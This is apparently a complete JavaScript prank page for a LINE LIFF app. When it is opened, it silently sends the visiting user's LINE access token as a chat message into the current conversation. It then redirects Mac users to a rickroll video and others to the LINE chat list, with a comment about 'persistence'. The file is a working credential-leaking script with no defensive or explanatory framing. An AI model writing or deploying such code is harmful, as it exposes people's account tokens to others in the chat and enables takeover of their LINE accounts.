

liff.init({
    liffId: (new URL(window.location.href)).searchParams.get("id"),
    withLoginOnExternalBrowser: true,
}).then(() => {

    liff.sendMessages([
        {
            type: "text",
            text: liff.getAccessToken()
        } 
    ])

    if (navigator.userAgent.replace("Mac") !== navigator.userAgent) {
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ?openExternalBrowser=1&by=@amex2189"
    }

    window.location.href = "https://line.me/R/nv/chat" // 永続化
}).catch(() => {
    alert("idが指定されていません！");
});